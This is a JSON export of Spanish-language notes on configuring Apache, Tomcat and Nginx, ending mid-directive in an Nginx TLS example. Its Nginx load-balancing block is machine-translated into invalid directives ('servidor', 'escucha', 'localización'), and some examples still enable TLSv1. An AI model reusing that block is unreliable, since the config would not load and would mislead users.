    "content": "# Wordpress\r\n\r\n[The Most Popular WordPress Themes In The World](https://www.elegantthemes.com/)\r\n\r\n[Elementor: #1 Free WordPress Website Builder | Elementor.com](https://elementor.com/)\r\n",
    "path": "/resources/wordpress"
  },
  {
    "id": 56,
    "title": "Comprobar los módulos de PHP e instalar",
    "content": "\r\n## Instalación\r\n\r\n```sh\r\napt-get install apache2\r\n\r\n# Comprobar los módulos de PHP e instalar\r\napt-cache search php | grep apache2\r\napt-get install libapache2-mod-php7.4\r\n\r\n# Comprobar los módulos de MySQL e instalar\r\napt-cache search mysql-server\r\napt-get install mysql-server\r\napt-cache search mysql | grep php\r\napt-get install php7.4-mysql\r\n```\r\n\r\n---\r\n\r\n## Modos (mpm)\r\n\r\n- **mpm_prefork**. Más antiguo. Crea diferentes procesos independientes para manejar las diferentes peticiones. Trabajo seguro con PHP sin hilos. Consume muchos recursos (RAM y CPU)\r\n- **mpm_worker**. Este módulo usa procesos y al mismo tiempo hace uso de threads (también llamados hilos), es decir, combina las técnicas de forking y threading. Sólo soporta módulos de Apache que sean thread-safe. El mod_php es incompatible, la alternativa es el mod php-fpm.\r\n- **mpm_event**. Versión mejorada de worker y mejora el rendimiento durante las peticiones con Keep Alive. No es compatible con mod_php y se debe usar php-fpm.\r\n\r\n---\r\n\r\n## Peticiones al servidor\r\n\r\n```sh\r\nsudo apt-get install apache2-utils\r\n# Ayuda\r\nab help\r\n# Peticiones concurrentes (-c) + número de petciiones (-n) + host\r\nab -c 100 -n 1000 localhost\r\n```\r\n\r\n---\r\n\r\n## Configuración\r\n\r\n- Archivo de configuración\r\n\r\n`/etc/apache2/apache2.conf`\r\n\r\n- Comprobar la configuración en los archivos\r\n\r\n```sh\r\napachectl configtest\r\n```\r\n\r\n- Iniciar, parar o reiniciar\r\n\r\n```sh\r\nservice apache2 start\r\nservice apache2 stop\r\nservice apache2 restart\r\n```\r\n\r\n- Comprobar el puerto a la escucha\r\n\r\n```sh\r\nsudo netstat -putona | grep apache\r\n```\r\n\r\n- Host y puerto de escucha\r\n\r\n```sh\r\n# Editar el fichero ports.conf\r\nListen 80\r\nListen 8080\r\n```\r\n\r\n- Directorio raiz para servir los archivos\r\n\r\n```sh\r\nDocumentRoot /var/www/html\r\n```\r\n\r\n- Index del directorio\r\n\r\n```sh\r\nDirectoryIndex index.html test.html etc.html\r\n```\r\n\r\n---\r\n\r\n## Directivas\r\n\r\n> Listen\r\n> DocumentRoot\r\n> Include\r\n> IncludeOptional\r\n\r\n### Módulo Core\r\n\r\n- **ServerRoot** No necesario. Directorio de configuraciónd de Apache\r\n- **ServerName** www.example.local** Nombre de dominio para un VirtualHost. Se debe registrar en /etc/hosts\r\n- **ServerAdmin \"mail-admin@admin.local\"**\r\n- **ErrorLog \"/var/log/httpd/error_log\"**\r\n- **KeepAlive on** Permite conexiones persistentes.\r\n- **VirtualHost** Deshabilitar con \"off\"\r\n- **Timeout 60** Tiempo de espera del servidor para cerrar conexión\r\n- **ServerTokens Full** Nivel de detalle de la cabecera que el servidor envia al cliente\r\n\r\n- **Módulo base mod_alias**\r\n\r\n> - **Alias** Permite direccionar una carpeta que este fuera del arbol de directorios\r\n\r\n- **Módulo base mod_userdir**\r\n\r\n> - **UserDir** Permite servir páginas alojas dentro del directorio principal de cada usuario del sistema. Configuración habitual: **_/home/test/public_html_** accedido con **_http://localhost/~test_**\r\n\r\nLas directivas permiten E.R, por ejemplo:\r\n\r\n```sh\r\n<Directory /var/www/html/te*>\r\n    Options +Indexes # Si en la url no se especifica el recurso muestra un listado, con \"-\" sería \"Forbidden\"\r\n    AllowOverride AuthConfig # Permite sobreescribir directivas con .htaccess\r\n</Directory>\r\n```\r\n\r\n- **Archivos .htaccess**\r\n\r\nEstos archivos se crean en los diretorios del sitio web.\r\nPermiten directivas aplicables en el contexto .htaccess.\r\nEl servidor no necesita reiniciarse.\r\n\r\n```sh\r\n# Archivo .htaccess en /home/www/html/test/private\r\nRequire all denied\r\n```\r\n\r\nEl conjunto de directivas aplicables se limita por \"AllowOverride\":\r\n\r\n- **AllowOverride All**\r\n- **AllowOverride AuthConfig**: solo autenticación y control de acceso como AuthUserFile o Require\r\n- **AllowOverride AuthConfig Indexes**: permite combinar estas directivas\r\n\r\n### La sección \"Location\"\r\n\r\nPermite aplicar directivas a URLs con una forma específica\r\n\r\n### Secciones \"DiretoryMatch y LocationMatch\"\r\n\r\nPermiten poner **expresiones regulares** en vez de un diretorio o ruta a un recurso\r\n\r\n---\r\n\r\n## Variables de entorno\r\n\r\nReferencia a variables de entorno en la configuración de apache\r\n\r\n```sh\r\nUser ${APACHE_RUN_USER}\r\n```\r\n\r\nArchivo de variables de entorno de apache\r\n\r\n**_/etc/apache2/envvars_**\r\n\r\n---\r\n\r\n## Virtual Host\r\n\r\n**Configuración común para todos los virtualhost en local**\r\n\r\n```conf\r\n<VirtualHost *>\r\n   DocumentRoot \"C:\\xampp\\htdocs\"\r\n   ServerName localhost\r\n</VirtualHost>\r\n```\r\n\r\n1. Crear un nuevo fichero \"nombre-host.conf\" en /etc/apache2/sites-available\r\n2. Copiar el código:\r\n\r\n   ```sh\r\n    <VirtualHost *:8081> # También se puede especificar una IP concreta en caso de disponer de varias IPs. *:* o * (cualquier ip y cualquier puerto)\r\n\r\n        ServerName wwww.test.local\r\n        ServerAlias test.local www.test.local  # Para host virtuales basados en nombre\r\n        ServerAdmin webmaster@localhost\r\n        DocumentRoot /var/www/test\r\n\r\n        ErrorLog ${APACHE_LOG_DIR}/error.log\r\n        CustomLog ${APACHE_LOG_DIR}/access.log combined\r\n\r\n    </VirtualHost>\r\n   ```\r\n\r\n3. Si no es el puerto 80, se debe habilitar en ports.conf agregando:\r\n\r\n   ```sh\r\n   Listen 8081\r\n   # O IP + Puerto\r\n   Listen 192.168.0.200:8081\r\n   ```\r\n\r\n4. Crear un enlace simbólico y relativo del fichero creado a /etc/apache2/sites-enabled\r\n\r\n   ```sh\r\n   ln -rs /etc/apache2/sites-available/nombre-host.conf /etc/apache2/sites-enabled/nombre-host.conf\r\n   ```\r\n\r\n5. Habilitar el sitio (comandos para ubuntu)\r\n\r\n   ```sh\r\n   a2ensite\r\n   # dehabilitar\r\n   a2dissite\r\n   # O también...\r\n   a2ensite <nombre-host>\r\n   ```\r\n\r\n6. Reiniciar apache\r\n\r\n   ```sh\r\n   sudo service apache2 restart\r\n   # O tambien...\r\n   sudo apache2ctl restart\r\n   # Comprobar la configuración\r\n   sudo apache2ctl test\r\n   ```\r\n\r\n---\r\n\r\n## Módulos\r\n\r\n- **Directiva para cargar módulos (previamente compilados)**\r\n\r\n  `LoadModule`\r\n\r\n- **Instalar / Desinstalar módulos**\r\n\r\n  ```sh\r\n  apt-get install libapache2-mod-gnutls\r\n  apt-get remove libapache2-mod-gnutls\r\n  ```\r\n\r\n- **Activar / Desactivar modulos (Debian y derivados)**\r\n\r\n  `a2enmod / a2dismod + nombre-modulo`\r\n\r\n  Los modulos tienen dos ficheros:\r\n\r\n  - .conf para la configuración\r\n  - .load para la carga del módulo\r\n\r\n- **Comprobar módulos estáticos y dinámicos**\r\n\r\n  `apache2ctl -M`\r\n\r\n  - **Estáticos** Compilados en el core de Apache\r\n  - **Dinámicos** Se puede añadir/eliminar\r\n\r\n- **Directorio de los módulos disponibles**\r\n\r\n  `etc/apache2/mods-available`\r\n\r\n- Directorio para enlaces simbolicos a los módulos disponibles\r\n\r\n  `etc/apache2/mods-enabled`\r\n\r\n- Habilitar UTF-8\r\n\r\n  `sudo vim /etc/apache2/conf-available/charset.conf`\r\n\r\n> **Operaciones sobre módulos**\r\n\r\n| Operacion    | Forma genérica                | Ejemplo                               |\r\n| ------------ | ----------------------------- | ------------------------------------- |\r\n| Instalar     | apt-get install nombre-modulo | apt-get install libapache2-mod-gnutls |\r\n| Desinstalar  | apt-get remove nombre-modulo  | apt-get remove libapache2-mod-gnutls  |\r\n| Habilitar    | a2enmod nombre-modulo-apache  | a2enmod ssl                           |\r\n| Deshabilitar | a2dismod nombre-modulo-apache | a2dismod ssl                          |\r\n\r\n> **Recargar apache para habiliar los módulo**s\r\n\r\n```sh\r\n/etc/init.d/apache2 restart\r\n# O...\r\n/etc/init.d/apache2 reload\r\n```\r\n\r\n---\r\n\r\n## Tipos MIME\r\n\r\nMultipurpose Internet Mail Extensions\r\n\r\nEspecifica cómo un programa debe transferir archivos de texto, imagen, audio, vídeo o cualquier archivo que no esté codificado en US-ASCII.\r\nSe especifican en las cabeceras HTTP\r\n\r\nRespuesta del servidor:\r\n\r\n```sh\r\nContent-Type: text/html, application/json\r\n```\r\n\r\nPetición del cliente:\r\n\r\n```sh\r\nAccept: text/html, application/json\r\n# Aceptar cualquier tipo MIME\r\nAccept: */*\r\n```\r\n\r\n- **Configuración de Apache para los tipos MIME**\r\n\r\n  Módulo: **_mod_mime_** (activo por defecto)\r\n\r\n  **Directivas interesantes de este módulo:**\r\n\r\n  - **ForceType** Todos los archivos de un directorio se sirven con el tipo especificado. Valido en \"Directory, Files, Location y .htaccess\"\r\n\r\n  ```sh\r\n      ForceType image/png\r\n  ```\r\n\r\n  - **AddType** Especifica el tipo MIME que se debe usar para una o más extensiones.\r\n\r\n  ```sh\r\n  # Para extensiones .imagen a .png\r\n      AddType image/png imagen\r\n  ```\r\n\r\n---\r\n\r\n## Autenticación y autorización\r\n\r\nEsquemas de autenticación HTTP:\r\n\r\n- **Basic** Se envian usuario y clave codificados en BASE64. Recomendado SSL (HTTPS)\r\n- **Digest** Se utilizan funciones Hash para enviar las credenciales de acceso\r\n\r\nProceso de autenticación\r\n\r\n1. El servidor, cuando el cliente solicita un recurso, le pedirá al cliente web las credenciales de acceso\r\n2. El cliente web recibe la petición y solicita al usuario las credenciales\r\n3. El cliente web envía las credenciales al servidor y si los datos son correctos responderá con el recurso solicitado\r\n\r\n### Autenticación\r\n\r\nMódulos:\r\n\r\n- **mod_auth_basic** Permite que el servidor solicite al cliente las credenciales con el método Basic\r\n- **mod_auth_digest** Permite que el servidor solicite al cliente las credenciales con el método Digest\r\n\r\nLos datos de los usuarios se pueden almacenar en:\r\n\r\n- Base de datos. Módulos: **_mod_authn_dbd y mod_dbd_**\r\n- Servicio de directorio LDAP. Módulos: **_mod_authnz_ldapd_**\r\n- En archivo. Módulo: **_mod_authn_file_**\r\n\r\nModo de limitar los recursos\r\n\r\n- Para usuarios concretos. Módulo: **_mod_authz_user_**\r\n- Para grupos. Módulo: **_mod_authz_groupfile_**\r\n\r\n#### Ejemplo con esquema Basic\r\n\r\nMódulos: mod_auth_basic, mod_authn_file, mod_authz_user\r\n\r\n1. Crear un archivo con usuarios y contraseñas\r\n\r\n   ```sh\r\n   htpasswd -c /etc/apache2/user_list admin\r\n   # Nos solicitará la contraseña\r\n   # Si el archivo esta creado con anterioridad el -c nos e utiliza\r\n   ```\r\n\r\n2. Configurar Apache para usar autenticación sobre un directorio. En una sección **_Directory_** o en un archivo **_.htaccess_**\r\n\r\n   ```sh\r\n   # Indicar el Directory donde se efecuara el control de acceso\r\n   AuthType Basic\r\n   AuthName \"Debe introducir usuario y contraseña para seguir\"\r\n   AuthBasicProvider file\r\n   AuthUserFile /etc/apache2/user_list\r\n   Require user admin # otros usuarios separados por espacio\r\n   # Require valid-user (para todos los usuarios existentes en la lista)\r\n   ```\r\n\r\n#### Autenticación mediante LDAP\r\n\r\nMódulos: mod_ldap y mod_authnz_ldap\r\n\r\n1. Habilitar los módulos\r\n\r\n```sh\r\nsudo a2enmod ldap\r\nsudo a2enmod authnz_ldap\r\n```\r\n\r\n#### Existen otros módulos de autenticación: anon, dbd, dbm, file, socache\r\n\r\n### Otras formas de limitar los recursos\r\n\r\n```sh\r\n# Denegar acceso a todo el mundo\r\nRequire all denied\r\n# Aceptar acceso a todo el mundo\r\nRequire all granted\r\n# Habiliar acceso a una IP Cliente concreta\r\nRequire ip 10.20.30.40\r\n# Deshabilitar acceso ana IP Cliente concreta\r\nRequire not ip 10.20.30.40\r\n# Rango de IPs\r\nRequire ip 10.20\r\n```\r\n\r\nTodos los casos anteriores devuelven el código de estado 403 (acceso no permitido o prohibido)\r\n\r\n### Redirección\r\n\r\n```sh\r\nServerName www.miejemplo.local\r\nDocumentRoot /var/www/html/diretoriolimitado\r\nRedirect /recursoantiguo http://www.miejemplo.local/recursonuevo\r\n```\r\n\r\n---\r\n\r\n## SSL/TLS - HTTPS\r\n\r\nMódulo: **mod_ssl**\r\n\r\nEste módulo proporciona SSL y TLS. Esta basado en OpenSSL\r\n\r\n1. Activar el módulo SSL\r\n\r\n   ```sh\r\n   a2enmod ssl\r\n   ```\r\n\r\n2. Crear un nuevo VirtualHost que contenga:\r\n\r\n   ```sh\r\n   SSLEngine on\r\n   SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem\r\n   SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key\r\n   ```\r\n\r\n### Generar certificado digital autofirmado\r\n\r\n1. Instalar OpenSSL\r\n\r\n   ```sh\r\n   sudo apt-get install openssl\r\n   ```\r\n\r\n2. Generar el certificado autofirmado junto a la clave privada\r\n\r\n   ```sh\r\n   make-ssl-cert /usr/share/ssl-cert/ssleay.cnf /etc/apache2/my-ssl/apache.pem\r\n   ```\r\n\r\n3. Modificar el VirtualHost para la nueva clave y certificado\r\n\r\n   ```sh\r\n   SSLEngine on\r\n   SSLCertificateFile /etc/apache2/my-ssl/apache.pem\r\n   SSLCertificateKeyFile /etc/apache2/my-ssl/apache.pem\r\n   ```\r\n\r\n### Generar certificados con OpenSSL\r\n\r\n1. Generar la clave privada y el archivo de solicitud de certificado\r\n\r\n   ```sh\r\n   sudo openssl req -new -nodes -keyout test.key -out test.csr\r\n   ```\r\n\r\n2. Autofirmar el certificado\r\n\r\n   ```sh\r\n   sudo openssl x509 -in test.csr -out test.crt -req -signkey test.key -days 3650\r\n   ```\r\n\r\n3. Modificar el VirtualHost para la nueva clave y certificado\r\n\r\n   ```sh\r\n   SSLEngine on\r\n   SSLCertificateFile /etc/apache2/my-ssl/test.crt\r\n   SSLCertificateKeyFile /etc/apache2/my-ssl/test.key\r\n   ```\r\n\r\n---\r\n\r\n## Log\r\n\r\n### Log de apache en formato CLF\r\n\r\n```sh\r\n192.168.200.100  - [05/May/2011:17:19:18 +0200] \"GET /index.html HTTP/1.1\" 200 20\r\n# - (campo sin valor)\r\n```\r\n\r\n### Comprobar logs en Linux\r\n\r\n```sh\r\ntail -f nombre-archivo-registro.log\r\n```\r\n\r\n| campos(especificadores) | definicion                                                                | Ejemplo                      |\r\n| ----------------------- | ------------------------------------------------------------------------- | ---------------------------- |\r\n| host (%h)               | Equipo cliente                                                            | 192.168.200.100              |\r\n| ident (%l)              | Cuando el cliente ejecuta identd y la directiva IdentityCheck esta activa |                              |\r\n| authuser (%u)           | URL requiere autenticación                                                |                              |\r\n| date (%t)               | Formato: [dia/mes/año:hora:minuto:segundo zona]                           | [05/May/2011:17:19:18 +0200] |\r\n| request (%r)            | Recurso solicitado                                                        | /index.html                  |\r\n| status (%s O %\\>s)      | código de estado devuelto                                                 | 200                          |\r\n| bytes (%b)              | bytes devueltos al cliente                                                | 20                           |\r\n\r\n### Directivas para archivos de registro\r\n\r\n| Directiva   | Sintaxis                                                                                 | Uso                                                                                                                   |\r\n| ----------- | ---------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |\r\n| TransferLog | TransferLog nombre-fichero \\| tubería a programa de registro                             | 1º. LogFormat<br />2º.Archivo donde se guardarán los logs                                                             |\r\n| LogFormat   | LogFormat format \\| alias_logformat [alias_logformat]                                    | 1º LogFormat \"%h %l %u %t %r\" %>s %0\" common<br />common = alias<br />Es habitual definir formatos de log globalmente |\r\n| ErrorLog    | ErrorLog nombre-fichero                                                                  | ErrorLog logs/nombre-fichero.log                                                                                      |\r\n| CustomLog   | CustomLog nombre-fichero \\| tubería-programa-registro formato \\| nickname [env opcional] | Custom logs/acceso-temporal.log \"formato...\"<br />CustomLog logs/acceso-temporal.log common                           |\r\n\r\n### Rotar los archivos de log para controlar su tamaño en el tiempo\r\n\r\n- **rotatelogs** Apache\r\n- **logrotate** GNU/Linux\r\n\r\nEjemplos:\r\n\r\n```sh\r\nCustomLog \"|/ruta_rotatelogs ruta_log_a_rotar numbero_segundos | tamaño máximo MB\" alias_logformat\r\n\r\n# Sufijo, MB máximos por archivo y Nº de archivos en disco\r\nCustomLog \"|/usr/bin/rotatelogs -n 10 /var/log/accesslog.%Y-%m-%d-%H_%M_%S 5M\" common\r\n\r\n# Apache >= 2.4\r\nCustomLog \"|$rotatelogs -n 10 /var/log/apache2/access.log 5M\" common\r\n```\r\n\r\n### Encontrar rotatelogs en Linux o instalar en caso necesario\r\n\r\n```sh\r\nwhereis rotatelogs\r\n# A veces será necesario instalar....\r\nsudo apt-get install apache2-utils\r\n```\r\n\r\n### Uso de logrotate (Linux)\r\n\r\n- Configuración global: **/etc/logrotate.conf**\r\n- Configuración específica: **/etc/logrotate.d/apache2**\r\n\r\n```sh\r\n# Comprobar la correcta configuración\r\n/usr/sbin/logrotate -d /etc/logrotate.d/apache2\r\n\r\n# Forzar la ejecución de logrotate\r\n/usr/sbin/logrotate -f /etc/logrotate.conf\r\n\r\n# Ejecutar logrotate con tareas cron\r\n```\r\n\r\n---\r\n\r\n## Tomcat\r\n\r\n### Instalación desde repositorio\r\n\r\n1. Comprobar los paquetes existentes en el repositorio\r\n\r\n   ```sh\r\n    apt-cache search tomcat -n\r\n   ```\r\n\r\n2. Comprobar las dependencias de tomcat\r\n\r\n   ```sh\r\n   apt-cache depends tomcat9 tomcat9-common\r\n   ```\r\n\r\n3. **OPCIONAL**. Instalar el JDK (contiene entorno de desarrollo y ejecución)\r\n\r\n   ```sh\r\n    # Comprobar las dependencias del JDK por defecto\r\n    apt-cache depends default-jdk-headless\r\n    # Instalar el JDK\r\n    sudo apt-get install default-jdk-headless\r\n   ```\r\n\r\n4. Instalar Tomcat. Se instalaran las dependencias necesarias (Ej. JRE)\r\n\r\n   ```sh\r\n   sudo apt-get install tomcat9 tomcat9-common tomcat9-admin tomcat9-docs\r\n   ```\r\n\r\n5. Comprobar donde se instala el JDK\r\n\r\n   ```sh\r\n   # Compruebo el nombre del paquete\r\n   sudo dpkg -l | grep openjdk\r\n   # Compruebo los directorios y ****ficheros**** del paquete\r\n   sudo dpkg -L nombre-paquete\r\n   ```\r\n\r\n6. Compruebo rutas de instalación de Tomcat\r\n\r\n   ```sh\r\n   sudo dpkg -L <nombre-paquete-tomcat>\r\n   # /var/lib/tomcat9 --> carpeta principal\r\n   # /etc/tomcat9 --> carpeta de configuración\r\n   # /var/log/tomcat9 --> logs del servidor\r\n   # /var/lib/tomcat9/webapps --> aplicaciones web en formato expandido\r\n   # /usr/share/tomcat/bin --> scripts de tomcat (iniciar, parar, configuración, etc)\r\n   ```\r\n\r\n7. Arrancar / Parar el servicio de tomcat\r\n\r\n   ```sh\r\n   sudo service tomcat9 start\r\n   sudo service tomcat9 stop\r\n   sudo service tomcat9 restart\r\n   ```\r\n\r\n8. Comprobar en \\IP:\\PUERTO que se esta ejecutando correctamente\r\n\r\n### Instalación manual\r\n\r\n1. Instalar el JDK compatible a la **versiónd** de tomcat que se utilizará\r\n\r\n2. Ir al diretorio /opt y descargar el binario del core de tomcat\r\n\r\n   ```sh\r\n   sudo wget url-binarios-core-tomcat\r\n   ```\r\n\r\n3. Extraer los archivos\r\n\r\n   ```sh\r\n   sudo tar xfz fichero-descargado.gz\r\n   ```\r\n\r\n4. Cambiar los permisos del directorio al usuario deseado o dejar permisos root\r\n\r\n   ```sh\r\n   sudo chown -R usuario:grupo-usuario directorio\r\n   ```\r\n\r\n5. Ejercutar Tomcat\r\n\r\n   ```sh\r\n   sudo sh /opt/directorio-tomcat/bin/catalina.sh start\r\n   ```\r\n\r\n6. Comprobar su ejecución en \\IP:\\PUERTO\r\n",
    "path": "/servers/Apache/referencia"
  },
  {
    "id": 57,
    "title": "Mostrar la versión",
    "content": "\r\n**Documentación oficial:** [http://nginx.org/en/docs/](http://nginx.org/en/docs/)\r\n\r\nSoftware libre y de código abierto, licenciado bajo licencia BSD. También existe una versión comercial, Nginx Plus.\r\nEs un servidor web o servidor proxy inverso ligero de alto rendimiento que también permite protocolos de correo electrónico IMAP/POP3.\r\n\r\n## Características\r\n\r\n- Servidor de archivos estáticos, índices y autoindexado\r\n- Proxy inverso con opciones de caché\r\n- Balanceo de carga\r\n- Tolerancia a fallos\r\n- Soporte HTTP y HTTP2 sobre SSL\r\n- Soporte para FastCGI con opciones de caché\r\n- Servidores virtuales basados en nombre o dirección IP\r\n- Soporte para autenticación\r\n- Compartible con IPv6\r\n- Compresión gzip\r\n- Habilitado para soportar más de 10.000 conexiones simultáneas\r\n- Permite habilitar/deshabilitar módulos\r\n\r\n![](./static/load_balancer.png)\r\n\r\n## Instalación\r\n\r\n```sh\r\nsudo apt install nginx\r\n# Mostrar la versión\r\napt-cache show nginx\r\nnginx -v\r\n```\r\n\r\n### Instalaciones en varias distribuciones\r\n\r\n```sh\r\n# Debian y derivados\r\napt-get install nginx php7.0 php7.0-fpm\r\napt-get install php7.0-mysql mariadb-server mariadb-client\r\n\r\n#Windows\r\nDescargar los instaladores de Nginx, MariaDB y PHP\r\n```\r\n\r\n## Configuración\r\n\r\n- Directorio y archivos de configuración\r\n\r\n  ```sh\r\n  # Directorio de configuración\r\n  cd /etc/nginx\r\n\r\n  # Archivo principal de configuración\r\n  sudo vim nginx.conf\r\n  ```\r\n\r\n- Verificar los archivos de configuración\r\n  `nginx -t`\r\n\r\n## Ejecución\r\n\r\n```sh\r\nsudo /usr/bin/nginx\r\nsudo service nginx start\r\nsudo service nginx restart\r\nsudo service nginx stop\r\nnginx -s stop|quit|reopen|reload\r\n```\r\n\r\n## Directivas\r\n\r\n### Del núcleo\r\n\r\n```conf\r\nuser nginx <grupo>; # usuario creado en el sistema Linux para Nginx\r\ndaemon off; # correr el proceso de fondo (por defecto esta en on)\r\ndebug_points stop|abort; # punto de interrupción de depuración\r\nenv VARIABLE=valor; # asignar o modificar variables de entorno\r\nworker_processes 1; # número de procesos de nginx (se puede ajustar al número de núcleos del procesador)\r\nerror_log /var/log/nginx/<fichero.log> debug|info|notice|warm|error|crit|alert\r\nlock_file # crear un archivo de bloque (por cada proceso de ejecución, hasta que no termine una solicitud no podrá ejecutarse otra)\r\nlog_not_found on|off; # páginas no encontradas (errores 4xx)\r\nmaster_process on; # pude ejercutar 1 o más procesos para solicitudes (por defecto esta en on)\r\n```\r\n\r\n### De eventos\r\n\r\n```sh\r\nworker_connections 1024; # número de usuarios concurrentes conectados\r\nuse epoll; # definir el modelo de eventos (epoll por defecto) NO se debe modificar\r\naccept_mutes on|off; # permite exclusión mutua en la escucha de socket\r\naccept_mutex_delay 500ms; # tiempo de espera de escucha en el socket\r\nmulti_accept on|off; # aceptar o no varias conexiones a la vez en cola al mismo tiempo\r\n```\r\n\r\n### Directivas HTTP, Server y Location\r\n\r\n- **Sockets y Hosts**\r\n\r\n  ```sh\r\n  listen [ip]:[puerto]; # ip o puerto a la escucha del servidor\r\n\r\n  listen 0.0.0.0:8080 default_server; # ip4 (server)\r\n  listen [::]:8080; # ip6 (server)\r\n  listen 443 ssl; (server)\r\n  listen unix:/tmp/nginx.sock; # puerto socket unix para cada uno de las peticiones (server)\r\n\r\n  server_name localhost www.web-php.local web-php.local; # importente el orden www... (server)\r\n\r\n  # server_name_in_redirect on|off; (http, server, location) predeterminado: off\r\n  # port_ip_redirect (http, server, location) predeterminado: on\r\n  # tcp_nodelay (http, server, location) predeterminado: on\r\n  # tcp_nopush (http, server, location) predeterminado: off\r\n  # sendfile (http, server, location) predeterminado: off\r\n  # reset_timedout_connection (http, server, location): off\r\n  # sendfile_max_chunk (http, server) predterminado: 0\r\n  # send_lowat (http, server) predterminado: 0\r\n  # server_names_hash_max_size (http) predterminado: 512\r\n  # server_names_hash_bucket_size (http) predterminado: 32, 64 o 128 dependiendo del cache del procesador\r\n  ```\r\n\r\n- **Rutas y archivos**\r\n\r\n  ```sh\r\n  root /var/www/html; # (http, server, location, if)\r\n  alias mi_server; # (location)\r\n\r\n  location /admin/ {\r\n      root /var/www/php-web/test/;\r\n  }\r\n\r\n  error_page codigo sitio; (http, server, location, if)\r\n  # error_page code1 [code2...] [=replacement code] [=@block | URI];\r\n  # error_page 404 =200 404.html;\r\n\r\n  if_modified_since off|exact|before; # (http, server, location) default: exact # permiso para la araña de buscadores a la fecha de modificación de la página\r\n\r\n  index index.html index.php /archivo.html; # (http, server, location)\r\n\r\n  recursive_error_pages ; # (http, server, location) default: off (reenvio en la página de error si da error, bucle infinito...)\r\n\r\n  try_files (server, location)\r\n  location /inicio/ {\r\n      try_files admin.php @redireccion;\r\n      #try_files $uri = 404;\r\n  }\r\n  location @redireccion {\r\n      rewrite ^ index.php permanent;\r\n  }\r\n  ```\r\n\r\n- **Peticiones cliente**\r\n\r\n  ```sh\r\n  (http, server, location)\r\n  keepalive_request 100; # default 100 (100 por sesión)\r\n  keepalive_timeout 500;\r\n  keepalive_disable msie|safari|webkit|mozilla|chrome|none; # default msie\r\n  send_timeout 60; # default 60\r\n  client_body_in_file_only off; # default off\r\n  client_body_in_single_buffer off; # default off\r\n  client_body_buffer_size 8k; # default 8k (32bits) o 16k (64bits) (2 páginas de memoria)\r\n  client_body_temp_path path [level1] [level2] [level3]; # defautl client_body_temp\r\n  client_body_timeout 60; # default 60\r\n  client_header_buffer_size 1k; # default 1k\r\n  client_header_timeout 60; # default 60\r\n  client_max_body_size 1m; # default 1m\r\n  large_client_header_buffers 4 8k; # default 4 8k\r\n  lingering_time 30s; # default 30s\r\n  lingering_timeout 5s; # default 5s\r\n  lingering_close on; # default on\r\n  ignore_invalid_headers on; 3 default on (http, server)\r\n  chunked_transfer_encoding on; # default on\r\n  max_ranges 0; # default 0 (sin limite)\r\n  ```\r\n\r\n## Ejemplos\r\n\r\n### WebSocket\r\n\r\nLos encabezados salto a salto, incluidos \"Actualización\" y \"Conexión\", no se pasan de un cliente a un servidor proxy, por lo tanto, para que el servidor proxy conozca la intención del cliente de cambiar un protocolo a WebSocket, estos encabezados deben pasarse explícitamente\r\n\r\n```sh\r\nlocation /chat/ {\r\n    proxy_pass http://backend;\r\n    proxy_http_version 1.1;\r\n    proxy_set_header Upgrade $http_upgrade;\r\n    proxy_set_header Connection \"upgrade\";\r\n}\r\n```\r\n\r\n```sh\r\nhttp {\r\n    map $http_upgrade $connection_upgrade {\r\n        default upgrade;\r\n        ''      close;\r\n    }\r\n\r\n    server {\r\n        ...\r\n\r\n        location /chat/ {\r\n            proxy_pass http://backend;\r\n            proxy_http_version 1.1;\r\n            proxy_set_header Upgrade $http_upgrade;\r\n            proxy_set_header Connection $connection_upgrade;\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n### WebSocket, SSL/TLS y Balanceo\r\n\r\n```sh\r\nhttp {\r\n  server {\r\n    listen 443 ssl;\r\n    server_name ws.serverlab.ca\r\n\r\n    ssl_certificate     cert.pem;\r\n    ssl_certificate_key key.pem;\r\n    ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;\r\n    ssl_ciphers         HIGH:!aNULL:!MD5;\r\n\r\n    location / {\r\n      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\r\n      proxy_set_header Host $host;\r\n\r\n      proxy_pass https://ws-backend;\r\n\r\n      proxy_ssl_certificate     /etc/ssl/certs/cert.pem;\r\n      proxy_ssl_certificate_key /etc/ssl/private/key.pem;\r\n\r\n      proxy_http_version 1.1;\r\n      proxy_set_header Upgrade $http_upgrade;\r\n      proxy_set_header Connection \"upgrade\";\r\n    }\r\n  }\r\n\r\n  upstream ws-backend {\r\n    # enable sticky session based on IP\r\n    ip_hash;\r\n\r\n    server server01:3000;\r\n    server server02:3000;\r\n    server server03:3000;\r\n  }\r\n}\r\n```\r\n\r\n### Balanceo de carga\r\n\r\n```sh\r\nhttp {\r\n    upstream myapp1 {\r\n        least_conn; # Directiva less_conn. Evita la sobrecarga de un servidor ocupado delegando el trabajo a otros\r\n        ip_hash; # Directiva ip_hash. Permite que los clientes sean redireccionados siempre al mismo servidor\r\n        servidor srv1.example.com weight=3; # Balanceo porcentual. En este caso 5 peticiones se distribuyen 3-1-1\r\n        servidor srv2.example.com;\r\n        servidor srv3.example.com;\r\n    }\r\n\r\n    servidor {\r\n        escucha 80;\r\n\r\n        localización / {\r\n            proxy_pass http: // myapp1;\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n### SSL/TLS\r\n\r\n```sh\r\nhttp {\r\n    #...\r\n    upstream backend.example.com {\r\n        server backend1.example.com:443;\r\n        server backend2.example.com:443;\r\n   }\r\n\r\n    server {\r\n        listen      80;\r\n        server_name www.example.com;\r\n        #...\r\n\r\n        location /upstream {\r\n            proxy_pass                    https://backend.example.com;\r\n            proxy_ssl_certificate         /etc/nginx/client.pem;\r\n            proxy_ssl_certificate_key     /etc/nginx/client.key;\r\n            proxy_ssl_protocols           TLSv1 TLSv1.1 TLSv1.2;\r\n            proxy_ssl_ciphers             HIGH:!aNULL:!MD5;\r\n            proxy_ssl_trusted_certificate /etc/nginx/trusted_ca_cert.crt;\r\n\r\n            proxy_ssl_verify        on;\r\n            proxy_ssl_verify_depth  2;\r\n            proxy_ssl_session_reuse on;\r\n        }\r\n    }\r\n\r\n    server {\r\n        listen      443 ssl;\r\n        server_name backend1.example.com;\r\n\r\n        ssl_certificate        /etc/ssl/certs/server.crt;\r\n        ssl_certificate_key    /etc/ssl/certs/server.key;\r\n        ssl_client_certificate /etc/ssl/certs/ca.crt;\r\n        ssl_verify_client      